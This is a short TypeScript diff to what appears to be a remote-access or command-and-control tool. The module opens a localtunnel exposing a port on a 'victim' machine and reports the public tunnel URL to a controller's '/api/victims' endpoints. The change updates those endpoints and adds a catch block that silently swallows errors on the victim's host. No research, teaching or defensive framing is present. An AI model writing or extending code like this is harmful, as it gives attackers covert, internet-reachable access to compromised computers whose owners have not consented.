@@ -6,17 +6,22 @@ namespace TunnelUtils {
   export const init = async (port: number) => {
     // Init localtunnel instance
     const tunnel = await localtunnel({ port });
-    HttpUtils.postJSON('/victims/msg', {
+    HttpUtils.postJSON('/api/victims/msg', {
       msg: `Opens port ${port} for localtunnel at URL: ${tunnel.url}`,
     });
     // Clean-up tunnel upon close
     exitHook(() => {
-      HttpUtils.postShellJSON('/victims/msg', {
-        msg: `Closes port ${port} for localtunnel at URL: ${tunnel.url}`,
-      });
-      HttpUtils.deleteShellJSON('/victims/tunnels', {
-        tunnelURL: tunnel.url,
-      });
+      try {
+        HttpUtils.postShellJSON('/api/victims/msg', {
+          msg: `Closes port ${port} for localtunnel at URL: ${tunnel.url}`,
+        });
+        HttpUtils.deleteShellJSON('/api/victims/tunnels', {
+          tunnelURL: tunnel.url,
+        });
+      } catch (err) {
+        // Ignore exceptions on victim's host
+      }
+
       tunnel.close();
     });
     return tunnel;
